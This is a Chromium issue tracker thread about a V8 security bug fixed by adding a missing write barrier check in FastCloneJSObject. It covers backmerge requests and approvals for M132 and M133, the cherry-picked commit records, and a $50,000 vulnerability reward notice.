Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M132. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M133. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### 24...@project.gserviceaccount.com (2025-01-30)

ClusterFuzz testcase 6596803809968128 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=98376:98377

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### pe...@google.com (2025-01-30)

Merge review required: M133 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), pbommana (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### pe...@google.com (2025-01-30)

Merge review required: M132 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), alonbajayo (ChromeOS), srinivassista (Desktop)

### ol...@chromium.org (2025-01-30)

1. security fix
2. https://chromium-review.googlesource.com/c/v8/v8/+/6206727
3. y
4-6. n

### am...@chromium.org (2025-02-01)

<https://crrev.com/c/6206727> approved for merges to M133 and M132; please merge this fix to 13.3 and 13.2 as soon as possible / NLT 10am Pacific on Monday, 3 February. M133 RC for Stable RC is being recut at that time for release on Tuesday and we should get this fix in, if at all possible, to reduce the potential for n-day exploitation. Also please do merge to 13.2 since M132 Extended Stable will be released on Tuesday.

Thanks in advance for working to get this in.

### ap...@google.com (2025-02-03)

Project: v8/v8  

Branch: refs/branch-heads/13.2  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6221320>

Merged: [runtime] Fix write barrier check in FastCloneJSObject

---


Expand for full commit details
```
Merged: [runtime] Fix write barrier check in FastCloneJSObject 
 
Add missing check for page being marked. 
 
Fixed: 392521083 
(cherry picked from commit ce071a295e54b32bf7f03373da943678231cb1ee) 
 
Change-Id: Iccfc1617862a6010ab34389aa4931f45e7389c05 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6221320 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Commit-Queue: Igor Sheludko <ishell@chromium.org> 
Commit-Queue: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Igor Sheludko <ishell@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.2@{#74} 
Cr-Branched-From: 24068c59cedad9ee976ddc05431f5f497b1ebd71-refs/heads/13.2.152@{#1} 
Cr-Branched-From: 6054ba94db0969220be4f94dc1677fc4696bdc4f-refs/heads/main@{#97085}

```

---

Files:

- M `src/codegen/code-stub-assembler-inl.h`
- M `src/codegen/code-stub-assembler.cc`
- M `src/codegen/code-stub-assembler.h`
- M `src/runtime/runtime-test.cc`
- M `src/runtime/runtime.h`

---

Hash: 8834c16acfcc226202633132ff2a1ad2779b4ed8  

Date:  Mon Feb 03 10:18:36 2025


---

### ap...@google.com (2025-02-03)

Project: v8/v8  

Branch: refs/branch-heads/13.3  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6219155>

Merged: [runtime] Fix write barrier check in FastCloneJSObject

---


Expand for full commit details
```
Merged: [runtime] Fix write barrier check in FastCloneJSObject 
 
Add missing check for page being marked. 
 
Fixed: 392521083 
(cherry picked from commit ce071a295e54b32bf7f03373da943678231cb1ee) 
 
Change-Id: I329cf0d24e7370a2c75047a98f07297b12c297fd 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6219155 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Igor Sheludko <ishell@chromium.org> 
Commit-Queue: Igor Sheludko <ishell@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.3@{#36} 
Cr-Branched-From: 41dacffe436aeb9311879cb07648f1e36609a804-refs/heads/13.3.415@{#1} 
Cr-Branched-From: 3348638c0af67c885b30891a358c89a917ac9759-refs/heads/main@{#97937}

```

---

Files:

- M `src/codegen/code-stub-assembler-inl.h`
- M `src/codegen/code-stub-assembler.cc`
- M `src/codegen/code-stub-assembler.h`
- M `src/runtime/runtime-test.cc`
- M `src/runtime/runtime.h`

---

Hash: a08ea62caa906ca59353a56c52955f35529ceb4c  

Date:  Tue Jan 28 15:18:22 2025


---

### sp...@google.com (2025-02-06)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $50000.00 for this report.

Rationale for this decision:
high-quality report demonstrating controlled write in a sandboxed process / the renderer 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-02-06)

Congratulations 303f06e3 on another excellent report! Thank you for your efforts and reporting this issue to us -- great work!

### pe...@google.com (2025-03-12)

The issue's primary component must be in the Component Tags, so re-adding it. To change the primary component, use the edit button at the top of the issue, just above the title.

### ch...@google.com (2025-05-08)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/392521083)*
